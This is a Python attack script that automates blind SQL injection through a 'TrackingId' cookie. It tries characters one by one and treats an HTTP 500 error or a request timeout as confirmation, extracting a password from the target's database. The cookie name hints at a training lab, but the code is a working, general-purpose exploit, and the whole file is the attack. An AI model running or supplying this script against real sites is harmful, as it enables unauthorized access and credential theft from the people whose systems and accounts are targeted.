import requests
import string


URL = input("Input URL: ").strip()
template = input("Input cookie: ")
charset = string.ascii_letters + string.digits
password = ""

print("Bruteforce...")
for i in range(1, 50):
    found = False
    for char in charset: 
        cookies_payload = template.format(i=i, char=char)
        cookies = {"TrackingId": cookies_payload}
    
        try:
            response = requests.get(URL, cookies=cookies, timeout=2)
            
            if response.status_code == 500:
                password += char
                print(f"No-{i} Found '{char}' --> password: {password}")
                found = True
                break
            
        except requests.exceptions.Timeout:
            password += char
            print(f"No-{i} Found '{char}' --> password: {password}")
            break

    if not found:
        print("Done...")
        break


print(f"Password: {password}")    